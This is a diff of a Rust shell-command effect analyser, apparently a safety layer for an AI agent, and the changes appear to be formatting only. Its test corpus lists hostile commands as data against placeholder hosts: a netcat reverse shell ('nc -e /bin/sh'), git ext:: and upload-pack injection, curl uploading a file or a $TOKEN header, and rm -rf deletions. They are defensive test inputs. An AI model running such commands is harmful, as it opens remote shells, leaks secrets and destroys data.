@@ -503,9 +503,10 @@ pub fn root_holds_repository(root: &str, base: Option<&str>) -> bool {
     }
     let mut path = std::path::PathBuf::from(expand_home(root));
     if path.is_relative()
-        && let Some(base) = base.map(str::trim).filter(|base| !base.is_empty()) {
-            path = std::path::PathBuf::from(expand_home(base)).join(path);
-        }
+        && let Some(base) = base.map(str::trim).filter(|base| !base.is_empty())
+    {
+        path = std::path::PathBuf::from(expand_home(base)).join(path);
+    }
     path.join(".git").exists()
 }
 
@@ -804,14 +805,16 @@ fn curl_saves_files(args: &[String]) -> bool {
         }
         // `-so FILE`: the cluster's last letter takes the next word; an
         // `o` inside a cluster takes the rest of it.
-        if arg.starts_with('-') && !arg.starts_with("--")
-            && let Some(at) = arg.find('o') {
-                return if at + 1 == arg.len() {
-                    !to_null(next)
-                } else {
-                    &arg[at + 1..] != "/dev/null"
-                };
-            }
+        if arg.starts_with('-')
+            && !arg.starts_with("--")
+            && let Some(at) = arg.find('o')
+        {
+            return if at + 1 == arg.len() {
+                !to_null(next)
+            } else {
+                &arg[at + 1..] != "/dev/null"
+            };
+        }
         false
     })
 }
@@ -908,9 +911,10 @@ pub fn looked_inside(command: &str) -> Vec<String> {
             let mut folders = folders.borrow_mut();
             for operand in lister_operands(program, args) {
                 if let Some(name) = folder_name(operand)
-                    && !folders.contains(&name) {
-                        folders.push(name);
-                    }
+                    && !folders.contains(&name)
+                {
+                    folders.push(name);
+                }
             }
         }
         ok
@@ -1677,9 +1681,10 @@ fn tree_args_ok(args: &[String]) -> bool {
                 return false;
             }
         } else if let Some(cluster) = arg.strip_prefix('-')
-            && (cluster.is_empty() || !cluster.chars().all(|c| "adfshDCn".contains(c))) {
-                return false;
-            }
+            && (cluster.is_empty() || !cluster.chars().all(|c| "adfshDCn".contains(c)))
+        {
+            return false;
+        }
     }
     true
 }
@@ -1808,11 +1813,13 @@ fn substitution_bodies(command: &str) -> Vec<String> {
             }
             let end = if depth == 0 { j - 1 } else { j };
             bodies.push(chars[i + 2..end].iter().collect());
-        } else if !in_single && c == '`'
-            && let Some(len) = chars[i + 1..].iter().position(|&x| x == '`') {
-                bodies.push(chars[i + 1..i + 1 + len].iter().collect());
-                i += len + 1;
-            }
+        } else if !in_single
+            && c == '`'
+            && let Some(len) = chars[i + 1..].iter().position(|&x| x == '`')
+        {
+            bodies.push(chars[i + 1..i + 1 + len].iter().collect());
+            i += len + 1;
+        }
         i += 1;
     }
     bodies
@@ -2090,9 +2097,10 @@ fn resolved_on_disk(class: EffectClass, lexical: EffectKey) -> EffectKey {
             continue;
         };
         if let Ok(rest) = base.strip_prefix(ancestor)
-            && !rest.as_os_str().is_empty() {
-                real.push(rest);
-            }
+            && !rest.as_os_str().is_empty()
+        {
+            real.push(rest);
+        }
         if let Some(leaf) = leaf {
             real.push(leaf);
         }
@@ -3730,9 +3738,10 @@ fn git(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
     out.opaque();
     if subcommand == "ls-remote" {
         if let [remote] = rest
-            && let Some(key) = url_effect(remote) {
-                out.add(key);
-            }
+            && let Some(key) = url_effect(remote)
+        {
+            out.add(key);
+        }
         return;
     }
     let spec = match subcommand.as_str() {
@@ -3756,9 +3765,10 @@ fn git(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
         out.add(key);
     }
     if subcommand == "clone"
-        && let Some(directory) = parsed.positionals.get(1) {
-            out.path(EffectClass::Write, directory, cwd);
-        }
+        && let Some(directory) = parsed.positionals.get(1)
+    {
+        out.path(EffectClass::Write, directory, cwd);
+    }
 }
 
 #[cfg(test)]
@@ -4654,10 +4664,12 @@ mod tests {
             &format!("cd {dir} && cp -R tmp-drupal/. ./ ; ls -a"),
             Some("/tmp/aidaemon-test/elsewhere"),
         );
-        assert!(reworded
-            .keys
-            .iter()
-            .any(|key| first.keys.iter().any(|declined| declined.overlaps(key))));
+        assert!(
+            reworded
+                .keys
+                .iter()
+                .any(|key| first.keys.iter().any(|declined| declined.overlaps(key)))
+        );
         // Relative `cd` from a known directory, and `||`.
         let nested = shell_call_effects("cd sub || exit 1\nrm -f x", Some(&dir));
         assert_eq!(nested.keys, vec![delete(&format!("{dir}/sub/x"))]);
@@ -4709,8 +4721,7 @@ mod tests {
     fn under_declaration_corpus() {
         use Expect::{Exact, Incomplete, Within};
         let w = "/tmp/aidaemon-test/w";
-        let cases: Vec<(&str, Expect)> =
-            vec![
+        let cases: Vec<(&str, Expect)> = vec![
             // C1: `cd` moves where relative targets land.
             ("cd /etc && echo x > f", Incomplete),
             ("pushd /etc && rm -f f", Incomplete),
@@ -4730,24 +4741,51 @@ mod tests {
             ("curl 'https://[a-b].example.invalid/'", Incomplete),
             ("ssh 'a?.example.invalid'", Incomplete),
             // C5: only a strict URL is read.
-            ("curl 'https://a.example.invalid\\@b.example.invalid/'", Incomplete),
-            ("curl 'https://u@a.example.invalid@b.example.invalid/'", Incomplete),
-            ("wget -O- 'http://a.example.invalid\\@b.example.invalid/'", Incomplete),
+            (
+                "curl 'https://a.example.invalid\\@b.example.invalid/'",
+                Incomplete,
+            ),
+            (
+                "curl 'https://u@a.example.invalid@b.example.invalid/'",
+                Incomplete,
+            ),
+            (
+                "wget -O- 'http://a.example.invalid\\@b.example.invalid/'",
+                Incomplete,
+            ),
             ("curl 'https://a.example.invalid /'", Incomplete),
             ("curl 'https://ä.example.invalid/'", Incomplete),
-            ("git ls-remote 'https://a.example.invalid\\@b.example.invalid/r'", Incomplete),
+            (
+                "git ls-remote 'https://a.example.invalid\\@b.example.invalid/r'",
+                Incomplete,
+            ),
             // I1: rsync --port.
             ("rsync --port=8730 f h.example.invalid:d", Incomplete),
-            ("rsync --port=8730 f rsync://h.example.invalid/m/", Incomplete),
+            (
+                "rsync --port=8730 f rsync://h.example.invalid/m/",
+                Incomplete,
+            ),
             // I2: proxies.
-            ("curl -x http://p.example.invalid https://a.example.invalid/", Incomplete),
-            ("curl -x socks5://p.example.invalid https://a.example.invalid/", Incomplete),
+            (
+                "curl -x http://p.example.invalid https://a.example.invalid/",
+                Incomplete,
+            ),
+            (
+                "curl -x socks5://p.example.invalid https://a.example.invalid/",
+                Incomplete,
+            ),
             (
                 "curl --proxy http://p.example.invalid:3128 https://a.example.invalid/",
                 Incomplete,
             ),
-            ("curl --socks5 p.example.invalid:1080 https://a.example.invalid/", Incomplete),
-            ("ALL_PROXY=socks5://p.example.invalid curl https://a.example.invalid/", Incomplete),
+            (
+                "curl --socks5 p.example.invalid:1080 https://a.example.invalid/",
+                Incomplete,
+            ),
+            (
+                "ALL_PROXY=socks5://p.example.invalid curl https://a.example.invalid/",
+                Incomplete,
+            ),
             // I3: scheme-less URLs.
             ("curl ftp.example.invalid/f", Incomplete),
             ("curl a.example.invalid/x", Incomplete),
@@ -4758,19 +4796,37 @@ mod tests {
             ("git pull https://a.example.invalid/r", Incomplete),
             ("git fetch https://a.example.invalid/r", Incomplete),
             ("git push https://a.example.invalid/r main", Incomplete),
-            ("git clone https://a.example.invalid/r /tmp/aidaemon-test/c", Incomplete),
+            (
+                "git clone https://a.example.invalid/r /tmp/aidaemon-test/c",
+                Incomplete,
+            ),
             ("git clone https://h.example.invalid/a.bundle", Incomplete),
             ("git ls-remote https://a.example.invalid/r", Incomplete),
-            ("git ls-remote --heads https://a.example.invalid/r", Incomplete),
+            (
+                "git ls-remote --heads https://a.example.invalid/r",
+                Incomplete,
+            ),
             // I5: rsync writes outside the destination.
             (
                 "rsync -b --backup-dir=/tmp/aidaemon-test/other src/ /tmp/aidaemon-test/dst/",
                 Incomplete,
             ),
-            ("rsync -T /tmp/aidaemon-test/t src/ /tmp/aidaemon-test/dst/", Incomplete),
-            ("rsync --temp-dir=/tmp/aidaemon-test/t src/ /tmp/aidaemon-test/dst/", Incomplete),
-            ("rsync --partial-dir=.p src/ /tmp/aidaemon-test/dst/", Incomplete),
-            ("rsync --log-file=/tmp/aidaemon-test/l src/ /tmp/aidaemon-test/dst/", Incomplete),
+            (
+                "rsync -T /tmp/aidaemon-test/t src/ /tmp/aidaemon-test/dst/",
+                Incomplete,
+            ),
+            (
+                "rsync --temp-dir=/tmp/aidaemon-test/t src/ /tmp/aidaemon-test/dst/",
+                Incomplete,
+            ),
+            (
+                "rsync --partial-dir=.p src/ /tmp/aidaemon-test/dst/",
+                Incomplete,
+            ),
+            (
+                "rsync --log-file=/tmp/aidaemon-test/l src/ /tmp/aidaemon-test/dst/",
+                Incomplete,
+            ),
             ("rsync -e ssh a h.example.invalid:d", Incomplete),
             (
                 "rsync -av /tmp/aidaemon-test/src/ /tmp/aidaemon-test/dst/",
@@ -4784,7 +4840,10 @@ mod tests {
             // M2: backups land beside the destination.
             ("cp -b a /tmp/aidaemon-test/f", Incomplete),
             ("cp --backup a /tmp/aidaemon-test/f", Incomplete),
-            ("mv -b /tmp/aidaemon-test/a /tmp/aidaemon-test/f", Incomplete),
+            (
+                "mv -b /tmp/aidaemon-test/a /tmp/aidaemon-test/f",
+                Incomplete,
+            ),
             // Probe list: curl.
             (
                 "curl -o /tmp/aidaemon-test/x https://a.example.invalid/",
@@ -4800,7 +4859,10 @@ mod tests {
                 "curl --resolve a.example.invalid:443:127.0.0.1 https://a.example.invalid/",
                 Incomplete,
             ),
-            ("curl --connect-to ::127.0.0.1: https://a.example.invalid/", Incomplete),
+            (
+                "curl --connect-to ::127.0.0.1: https://a.example.invalid/",
+                Incomplete,
+            ),
             (
                 "curl -d @file https://a.example.invalid/",
                 Exact(vec![egress("a.example.invalid:443")]),
@@ -4818,7 +4880,10 @@ mod tests {
                     egress("b.example.invalid:443"),
                 ]),
             ),
-            ("curl -w '%output{/tmp/x}' https://a.example.invalid/", Incomplete),
+            (
+                "curl -w '%output{/tmp/x}' https://a.example.invalid/",
+                Incomplete,
+            ),
             ("curl http://[::1]:8765/", Incomplete),
             // Probe list: wget.
             ("wget -i list", Incomplete),
@@ -4832,10 +4897,19 @@ mod tests {
             ),
             // Probe list: git.
             ("git push origin main", Incomplete),
-            ("git -C /tmp/aidaemon-test/r push https://a.example.invalid/r", Incomplete),
+            (
+                "git -C /tmp/aidaemon-test/r push https://a.example.invalid/r",
+                Incomplete,
+            ),
             ("git clone 'ext::sh -c x'", Incomplete),
-            ("git clone --upload-pack=x https://a.example.invalid/r", Incomplete),
-            ("git push --receive-pack=x https://a.example.invalid/r", Incomplete),
+            (
+                "git clone --upload-pack=x https://a.example.invalid/r",
+                Incomplete,
+            ),
+            (
+                "git push --receive-pack=x https://a.example.invalid/r",
+                Incomplete,
+            ),
             ("git commit -m x", Incomplete),
             // Repository config (diff.external, core.fsmonitor, aliases,
             // pagers, hooks) runs code for every git command.
@@ -4857,7 +4931,10 @@ mod tests {
             ),
             ("nc -l 8080", Incomplete),
             ("nc -e /bin/sh h.example.invalid 80", Incomplete),
-            ("nc -x p.example.invalid:1080 h.example.invalid 80", Incomplete),
+            (
+                "nc -x p.example.invalid:1080 h.example.invalid 80",
+                Incomplete,
+            ),
             ("python3 -m http.server", Incomplete),
             // Probe list: cp, mv, tee.
             (
@@ -4878,10 +4955,22 @@ mod tests {
             ),
             // Probe list: redirects.
             ("echo x >&2", Exact(vec![])),
-            ("echo x >| /tmp/aidaemon-test/f", Exact(vec![write("/tmp/aidaemon-test/f")])),
-            ("echo x &> /tmp/aidaemon-test/f", Exact(vec![write("/tmp/aidaemon-test/f")])),
-            ("echo x 2> /tmp/aidaemon-test/f", Exact(vec![write("/tmp/aidaemon-test/f")])),
-            ("echo x >& /tmp/aidaemon-test/f", Exact(vec![write("/tmp/aidaemon-test/f")])),
+            (
+                "echo x >| /tmp/aidaemon-test/f",
+                Exact(vec![write("/tmp/aidaemon-test/f")]),
+            ),
+            (
+                "echo x &> /tmp/aidaemon-test/f",
+                Exact(vec![write("/tmp/aidaemon-test/f")]),
+            ),
+            (
+                "echo x 2> /tmp/aidaemon-test/f",
+                Exact(vec![write("/tmp/aidaemon-test/f")]),
+            ),
+            (
+                "echo x >& /tmp/aidaemon-test/f",
+                Exact(vec![write("/tmp/aidaemon-test/f")]),
+            ),
             ("echo x > 'out file'", Incomplete),
             ("exec 3> /tmp/aidaemon-test/f", Incomplete),
             ("cat <> /tmp/aidaemon-test/f", Incomplete),
@@ -4902,11 +4991,11 @@ mod tests {
             ("( rm /tmp/aidaemon-test/x )", Incomplete),
             ("X=1 rm /tmp/aidaemon-test/x", Incomplete),
             // Probe list: deletes.
+            ("rm -- -rf", Exact(vec![delete("/tmp/aidaemon-test/w/-rf")])),
             (
-                "rm -- -rf",
-                Exact(vec![delete("/tmp/aidaemon-test/w/-rf")]),
+                "git ls-remote git@git.example.invalid:acme/repo.git",
+                Incomplete,
             ),
-            ("git ls-remote git@git.example.invalid:acme/repo.git", Incomplete),
             (
                 "unlink /tmp/aidaemon-test/x",
                 Exact(vec![delete("/tmp/aidaemon-test/x")]),
@@ -4932,7 +5021,10 @@ mod tests {
             // Unquoted expansion anywhere in a segment.
             ("echo {a,b} > /tmp/aidaemon-test/f", Incomplete),
             ("echo * > /tmp/aidaemon-test/f", Incomplete),
-            ("curl -H \"X: $TOKEN\" https://a.example.invalid/", Incomplete),
+            (
+                "curl -H \"X: $TOKEN\" https://a.example.invalid/",
+                Incomplete,
+            ),
             // Text the shell never executes yields no keys: heredoc bodies,
             // comments, and newlines inside quoted strings.
             (
@@ -4948,7 +5040,10 @@ mod tests {
                 Exact(vec![egress("b.example.invalid:443")]),
             ),
             ("echo x # ; rm -rf /tmp/aidaemon-test/w/keep", Exact(vec![])),
-            ("echo x #\ncurl https://b.example.invalid/", Exact(vec![egress("b.example.invalid:443")])),
+            (
+                "echo x #\ncurl https://b.example.invalid/",
+                Exact(vec![egress("b.example.invalid:443")]),
+            ),
             (
                 "echo \"a\nrm -rf /tmp/aidaemon-test/keep\ncurl https://a.example.invalid/\"",
                 Exact(vec![]),
@@ -4958,7 +5053,10 @@ mod tests {
                 Exact(vec![]),
             ),
             // N1: `>&WORD` is a file unless WORD is a descriptor.
-            ("echo hi >&1file", Exact(vec![write("/tmp/aidaemon-test/w/1file")])),
+            (
+                "echo hi >&1file",
+                Exact(vec![write("/tmp/aidaemon-test/w/1file")]),
+            ),
             ("echo hi >&2", Exact(vec![])),
             ("echo hi 2>&-", Exact(vec![])),
             ("echo hi >&2-", Exact(vec![])),
@@ -5055,18 +5153,24 @@ mod tests {
         // `rm -rf link/` deletes the target directory's contents.
         let trailing = shell_call_effects(&format!("rm -rf {w}/link/"), None);
         assert!(!trailing.complete);
-        assert!(trailing
-            .keys
-            .contains(&key(EffectClass::Delete, format!("{w}/a/real"))));
-        assert!(trailing
-            .keys
-            .contains(&key(EffectClass::Delete, format!("{w}/link"))));
+        assert!(
+            trailing
+                .keys
+                .contains(&key(EffectClass::Delete, format!("{w}/a/real")))
+        );
+        assert!(
+            trailing
+                .keys
+                .contains(&key(EffectClass::Delete, format!("{w}/link")))
+        );
         // `link/..` is the link target's parent, not `w`.
         let climbed = shell_call_effects(&format!("rm -rf {w}/link/../victim"), None);
         assert!(!climbed.complete);
-        assert!(climbed
-            .keys
-            .contains(&key(EffectClass::Delete, format!("{w}/a/victim"))));
+        assert!(
+            climbed
+                .keys
+                .contains(&key(EffectClass::Delete, format!("{w}/a/victim")))
+        );
         let redirected = shell_call_effects(&format!("echo x > {w}/link/../f"), None);
         assert!(!redirected.complete);
         assert_eq!(
